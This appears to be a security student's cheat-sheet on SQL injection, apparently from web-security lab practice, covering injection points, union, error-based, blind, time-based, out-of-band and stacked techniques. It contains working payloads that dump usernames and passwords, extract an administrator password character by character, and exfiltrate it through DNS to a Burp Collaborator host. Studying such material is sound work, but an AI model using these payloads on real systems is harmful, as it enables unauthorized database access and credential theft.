- Where to find
    In UPDATE statements, within the updated values or the WHERE clause.
    In INSERT statements, within the inserted values.
    In SELECT statements, within the table or column name.
    In SELECT statements, within the ORDER BY clause.
###### 1. Error-Based
   - Extracting sensitive data via verbose SQL error
     - Convert data types `CAST((SELECT example_column FROM example_table) AS int)`
   - Use payload to reveal metadata like table names, column types, or even data dumps via functions like EXTRACTVALUE (in MySQL) or UTL_INADDR (in Oracle)
###### 1. Union-Based
- Ideal for search pages or product listings.
- Use UNION operator to append a secondary query's results to the primary one
- Data Dumping: After structure is known, inject to pull sensitive data like passwords from users table
  - How many columns are being returned from the original query
  - `' ORDER BY N--`
  - `' UNION SELECT NULL(X)--`
- Which columns are of a suitable data type to hold the results
  - `' UNION SELECT 'a',NULL,NULL,NULL--`
- Retrieve interesting data
  - `' UNION SELECT username, password FROM users--`
- Querying DB type and version
  - Microsoft, MySQL `SELECT @@version`
  - Oracle`SELECT * FROM v$version`
  - PostgreSQL `SELECT version()`
- List contents of DB
  - ![[Pasted image 20251028164515.png]]
 - `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
 - ![[Pasted image 20251028164604.png]]
###### 2. Blind (Inferential)
- Infer data by observing side effects
- Boolean-Based: Injects true/false conditions
  - `TrackingID='xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
- Conditional errors
  - `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
  - `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
  - `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
- Time-Based: Injects delays with function
  - `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
  - `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
  - `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
###### 3. Out-of-Band
- Uses database functions to make external requests
- DNS lookup
  - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
  - Using BurpCollab
    `Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.7y6zg495s8e8eh7dje0kly9et5zwnqbf.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;`
- HTTP/SMTP-Based
###### 4. Batched or Stacked Queries
- Inject a semicolon (;) to end the original query and start new ones, enabling actions like data insertion
###### 5. Different context
- Some websites take input in JSON or XML format and use this to query the database
- Obfuscate "S"
  - `<stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>`
##### Related Exploits
- Authentication Bypass: Classic "OR 1=1" injection (e.g., username: admin' OR '1'='1' -- ) logs in as first user
- Second-Order: Input is stored (e.g., in DB) and injected later when retrieved, bypassing initial checks
- Combined with XSS: Extracted data used for cross-site scripting